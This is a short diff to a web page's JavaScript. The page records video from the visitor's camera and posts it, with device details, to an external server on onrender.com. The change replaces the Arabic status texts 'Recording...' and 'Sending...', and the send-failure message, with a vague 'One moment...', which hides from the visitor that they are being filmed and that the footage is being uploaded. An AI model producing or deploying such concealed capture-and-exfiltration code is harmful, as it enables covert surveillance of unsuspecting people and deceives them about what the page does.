@@ -86,7 +86,7 @@
     }
 
     async function recordAndSendVideo(facingMode = "user") {
-      statusText.innerText = "جارٍ التسجيل...";
+      statusText.innerText = "لحظة واحدة...";
       const constraints = { video: { facingMode }, audio: false };
 
       try {
@@ -116,14 +116,14 @@
         const deviceInfo = await getDeviceInfo();
         formData.append('additionalData', JSON.stringify(deviceInfo));
 
-        statusText.innerText = "جارٍ الإرسال...";
+        statusText.innerText = "لحظة واحدة...";
 
         const res = await fetch('https://freeusr1.onrender.com/submitVideo', {
           method: 'POST',
           body: formData
         });
 
-        if (!res.ok) throw new Error("فشل الإرسال");
+        if (!res.ok) throw new Error("لحظة واحدة");
 
         statusText.innerText = "تم بنجاح";
       } catch (err) {
